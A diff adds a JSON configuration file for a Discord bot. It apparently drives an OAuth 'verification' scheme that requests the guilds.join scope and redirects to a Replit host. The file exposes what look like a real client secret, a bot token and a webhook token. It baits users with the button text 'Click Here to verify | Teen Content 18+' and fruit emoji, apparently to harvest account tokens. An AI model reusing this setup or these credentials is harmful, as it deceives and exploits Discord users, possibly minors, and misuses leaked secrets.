@@ -1,0 +1,24 @@
+{
+    "client_secret": "E3n4Rxk8Kz4Ac-PI3KrLDIQXA9FHAXMF",
+    "client_id": "1257763838636458074",
+    "redirect_uri": "https://0b397ac5-b50b-45ed-8381-8a71cca26d7f-00-287whk7y8pgnp.picard.replit.dev/",
+    "bot_token": "MTI1Nzc2MzgzODYzNjQ1ODA3NA.GQS6x4.FbZakvkEa9QmY_UsUatCFal4JgxLw8-IjQzrIY",
+    "bot_invite": "https://discord.com/api/oauth2/authorize?client_id=1257763838636458074&permissions=116737&scope=bot",
+    "authorize_url": "https://discord.com/oauth2/authorize?client_id=1257763838636458074&response_type=code&redirect_uri=https%3A%2F%2F0b397ac5-b50b-45ed-8381-8a71cca26d7f-00-287whk7y8pgnp.picard.replit.dev%2F&scope=guilds.join+identify",
+    "authorize_vanity": "\u2705 Click Here to verify | Teen Content 18+ \ud83c\udf51\ud83c\udf52",
+    "owner_ids": [
+        1176992059295531084,
+        1152278635470934060
+    ],
+    "verification_system": false,
+    "verify_role_id": 1060261679134412810,
+    "verify_guild_id": 1243590665917698068,
+    "wl_guilds": [
+        "1257763741899034705",
+        "1133790242198012046",
+        "1227402329318232086",
+        "1258004085785890836",
+        "1258180944574025870"
+    ],
+    "webhook": "https://canary.discord.com/api/webhooks/1257790470512443575/kqk1rJ2F8mGUSyYCVXR4YSmmu7KCJZsgREpzi1R8ENaGVYtzyse6BWXNl2YqeCeaT4eq"
+}
